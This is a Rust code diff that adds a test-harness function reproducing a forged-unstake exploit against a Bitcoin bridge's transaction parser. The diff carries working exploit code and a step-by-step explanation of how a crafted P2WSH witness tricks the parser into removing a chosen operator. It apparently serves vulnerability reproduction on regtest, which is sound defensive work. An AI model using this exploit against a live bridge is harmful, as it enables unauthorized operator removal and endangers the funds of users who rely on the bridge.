@@ -20,6 +20,7 @@ use bitcoin::{
     absolute::LockTime,
     hashes::Hash,
     key::UntweakedKeypair,
+    opcodes::all::{OP_DROP, OP_PUSHNUM_1},
     script,
     secp256k1::{Secp256k1, XOnlyPublicKey, SECP256K1},
     taproot::{LeafVersion, TaprootBuilder, TaprootSpendInfo},
@@ -27,6 +28,7 @@ use bitcoin::{
     Address, Amount, BlockHash, Network, OutPoint, ScriptBuf, Sequence, Transaction, TxIn, TxOut,
     Witness,
 };
+use bitcoind_async_client::traits::Wallet;
 use rand::RngCore;
 use strata_asm_common::{AnchorState, Subprotocol};
 use strata_asm_params::BridgeV1InitConfig;
@@ -37,8 +39,9 @@ use strata_asm_proto_bridge_v1_txs::{
         build_deposit_request_spend_info, create_deposit_request_locking_script, DrtHeaderAux,
     },
     test_utils::create_test_operators,
+    unstake::{stake_connector_script, UnstakeTxHeaderAux},
 };
-use strata_asm_proto_bridge_v1_types::SafeHarbourAddress;
+use strata_asm_proto_bridge_v1_types::{OperatorIdx, SafeHarbourAddress};
 use strata_btc_types::BitcoinAmount;
 use strata_codec::VarVec;
 use strata_crypto::{test_utils::schnorr::Musig2Tweak, EvenPublicKey, EvenSecretKey};
@@ -395,6 +398,100 @@ impl AsmTestHarness {
 /// Build a trivially-spendable tapscript (OP_TRUE).
 fn build_trivial_script() -> ScriptBuf {
     script::Builder::new().push_int(1).into_script()
+}
+
+// ============================================================================
+// Forged unstake reproduction
+// ============================================================================
+
+/// Submits a forged unstake transaction that exercises the witness-layout bypass.
+///
+/// The transaction spends an attacker-funded P2WSH UTXO whose witnessScript is
+/// `OP_DROP OP_DROP OP_DROP OP_TRUE`. Bitcoin executes that witnessScript (the
+/// last witness element under P2WSH rules) and accepts the spend without any
+/// signature. ASM's unstake parser, however, only inspects `witness[2]` —
+/// where the attacker plants a canonical `stake_connector_script` bound to the
+/// real historical N/N pubkey. Without a binding between the witness-derived
+/// commitment and the actually-spent output, ASM concludes the spend was
+/// authorized by the multisig and removes `victim_idx` from the active
+/// operator set.
+///
+/// Returns the block hash containing the exploit transaction. Bitcoin Core
+/// accepts the transaction as a standard P2WSH spend, so no special policy
+/// flags are needed.
+pub async fn submit_forged_unstake_tx(
+    harness: &AsmTestHarness,
+    victim_idx: OperatorIdx,
+) -> anyhow::Result<BlockHash> {
+    // 1. Look up the current aggregated N/N pubkey from live bridge state. The attacker only needs
+    //    public information here: every historical agg key is observable as the program of an
+    //    on-chain P2TR bridge output.
+    let bridge_state = harness.bridge_state()?;
+    let nn_pubkey = bridge_state.operators().agg_key().to_xonly_public_key();
+
+    // 2. Trivial P2WSH script: drop the three stack items ASM expects to find in witness[0..=2] and
+    //    return true. Bitcoin executes this as the witnessScript; no signature is ever checked.
+    let trivial_witness_script = ScriptBuf::from_bytes(vec![
+        OP_DROP.to_u8(),
+        OP_DROP.to_u8(),
+        OP_DROP.to_u8(),
+        OP_PUSHNUM_1.to_u8(),
+    ]);
+    let p2wsh_address = Address::p2wsh(&trivial_witness_script, Network::Regtest);
+
+    // 3. Fund the attacker-controlled P2WSH output and confirm it so the exploit tx has a spendable
+    //    prevout.
+    let funding_amount = Amount::from_sat(10_000);
+    let (funding_txid, funding_vout) = harness
+        .create_funding_utxo(&p2wsh_address, funding_amount)
+        .await?;
+    harness.mine_block(None).await?;
+
+    // 4. The witness that ASM mis-parses as a real script-path Tapscript spend. Bitcoin parses the
+    //    same stack as a P2WSH spend: items 0..=2 are stack inputs (all popped by OP_DROPs) and
+    //    item 3 is the witnessScript.
+    let bogus_stake_hash = [0u8; 32];
+    let fake_executed_script = stake_connector_script(bogus_stake_hash, nn_pubkey);
+    let mut witness = Witness::new();
+    witness.push([0u8; 32]); // ASM reads this as the preimage
+    witness.push([0u8; 0]); // ASM reads this as the signature (unused)
+    witness.push(fake_executed_script.as_bytes()); // ASM reads as executed script
+    witness.push(trivial_witness_script.as_bytes()); // Bitcoin reads as witnessScript
+
+    // 5. SPS-50 OP_RETURN: subproto=Bridge, tx_type=Unstake, aux=victim_idx.
+    let aux = UnstakeTxHeaderAux::new(victim_idx);
+    let tag_data = aux.build_tag_data();
+    let op_return_script =
+        ParseConfig::new(harness.asm_params.magic).encode_script_buf(&tag_data.as_ref())?;
+
+    // 6. Send the leftover sats back to a wallet address so the tx pays a fee without producing a
+    //    dust violation.
+    let fee = AsmTestHarness::DEFAULT_FEE;
+    let change_address = harness.client.get_new_address().await?;
+    let change_output = TxOut {
+        value: funding_amount - fee,
+        script_pubkey: change_address.script_pubkey(),
+    };
+
+    let exploit_tx = Transaction {
+        version: Version::TWO,
+        lock_time: LockTime::ZERO,
+        input: vec![TxIn {
+            previous_output: OutPoint::new(funding_txid, funding_vout),
+            script_sig: ScriptBuf::new(),
+            sequence: Sequence::ENABLE_RBF_NO_LOCKTIME,
+            witness,
+        }],
+        output: vec![
+            TxOut {
+                value: Amount::ZERO,
+                script_pubkey: op_return_script,
+            },
+            change_output,
+        ],
+    };
+
+    harness.submit_and_mine_tx(&exploit_tx).await
 }
 
 // ============================================================================
